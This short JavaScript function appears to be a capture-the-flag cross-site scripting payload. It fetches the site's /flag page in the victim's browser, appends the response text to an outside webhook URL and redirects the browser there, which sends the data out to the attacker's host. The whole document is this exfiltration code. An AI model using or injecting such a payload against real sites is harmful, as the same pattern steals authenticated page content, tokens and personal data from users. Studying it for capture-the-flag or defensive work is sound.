async function forwardFlagToWebhook(webhookBaseUrl) {
    const response = await fetch(`${window.location.origin}/flag`);
    const flag = await response.text();
    const url = new URL(webhookBaseUrl);
    url.searchParams.set('flag', flag);
    window.location.href = url.toString();
}

